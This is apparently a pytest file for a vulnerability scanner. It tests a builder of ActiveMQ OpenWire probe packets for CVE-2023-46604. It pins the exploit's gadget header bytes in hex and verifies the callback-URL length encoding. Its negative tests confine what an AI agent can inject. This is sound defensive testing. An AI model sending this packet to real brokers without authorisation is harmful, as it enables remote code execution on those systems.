"""TC-AGENT-027: the OpenWire probe packet is built correctly and safely,
never from agent-supplied data.
"""

from __future__ import annotations

import pytest

from app import openwire_payload as owp

# The exact header string from nuclei's own verified template
# (javascript/cves/2023/CVE-2023-46604.yaml), pinned here so a change to
# either copy is caught immediately rather than silently drifting.
_REFERENCE_HEADER_HEX = (
    "00000001100000006401010100436f72672e737072696e676672616d65776f726b2e"
    "636f6e746578742e737570706f72742e46696c6553797374656d586d6c4170706c69"
    "636174696f6e436f6e74657874010"
)


def test_the_packet_header_matches_the_verified_reference_template_exactly():
    """This is the load-bearing byte sequence - it must match the
    community-vetted, nuclei-verified construction byte for byte, not an
    approximation of it."""
    assert owp.GADGETS["spring-fsxml-cve-2023-46604"] == _REFERENCE_HEADER_HEX


def test_build_probe_packet_embeds_the_callback_url_as_utf8():
    url = "https://scan.example.internal/callback/openwire/" + "a" * 43
    packet = owp.build_probe_packet(url)
    assert b"org.springframework.context.support.FileSystemXmlApplicationContext" in packet
    assert url.encode("utf-8") in packet
    assert packet.endswith(url.encode("utf-8"))  # the URL is the final field, nothing appended after it


def test_the_length_field_is_a_proper_2byte_big_endian_prefix():
    """The structurally-correct interpretation (Java DataOutputStream.writeUTF
    convention), not the reference JS's unpadded `.toString(16)` - which is
    only byte-aligned for length values needing an odd hex-digit count and
    silently misaligned for the common case (16-255 char URLs). Verified
    against the header's own trailing nibble: it is consistent with being the
    leading nibble of a 4-hex-digit (2-byte) length field, not a stray
    artifact."""
    url = "https://scan.example.internal/callback/openwire/" + "b" * 20
    packet = owp.build_probe_packet(url)
    url_bytes = url.encode("utf-8")
    # The 2 bytes immediately before the URL bytes must be its big-endian length.
    length_prefix = packet[len(packet) - len(url_bytes) - 2 : len(packet) - len(url_bytes)]
    assert int.from_bytes(length_prefix, "big") == len(url_bytes)
    assert packet.endswith(url_bytes)


@pytest.mark.parametrize("url_len", [1, 15, 16, 67, 68, 100, 255, 256, 500])
def test_the_length_field_is_correct_across_a_range_of_url_lengths(url_len):
    """The specific range (16-255 chars) where the reference JS's unpadded
    hex silently misaligns must be covered, not just the edges."""
    base = "https://a/"
    url = base + "x" * max(0, url_len - len(base))
    packet = owp.build_probe_packet(url)
    url_bytes = url.encode("utf-8")
    length_prefix = packet[len(packet) - len(url_bytes) - 2 : len(packet) - len(url_bytes)]
    assert int.from_bytes(length_prefix, "big") == len(url_bytes)


def test_negative_no_agent_supplied_bytes_reach_the_packet_beyond_the_callback_url():
    """The only variable input is the callback URL WE construct server-side
    (worker/app/openwire_callback.py) - build_probe_packet itself takes no
    other free-form argument that could smuggle agent-composed bytes in."""
    import inspect

    sig = inspect.signature(owp.build_probe_packet)
    assert list(sig.parameters) == ["callback_url", "gadget"]
    assert sig.parameters["gadget"].default == "spring-fsxml-cve-2023-46604"


def test_negative_a_non_url_callback_is_rejected():
    for bad in ("", "not-a-url", "ftp://example.com/x", "javascript:alert(1)"):
        with pytest.raises(ValueError):
            owp.build_probe_packet(bad)


def test_negative_an_unknown_gadget_is_rejected():
    with pytest.raises(ValueError):
        owp.build_probe_packet("https://example.com/x", gadget="something-agent-supplied")


def test_gadgets_table_has_exactly_one_entry():
    """Guards against this quietly growing into an agent-selectable menu -
    a new CVE is a deliberate, reviewed addition to this table, not a
    runtime choice."""
    assert list(owp.GADGETS) == ["spring-fsxml-cve-2023-46604"]
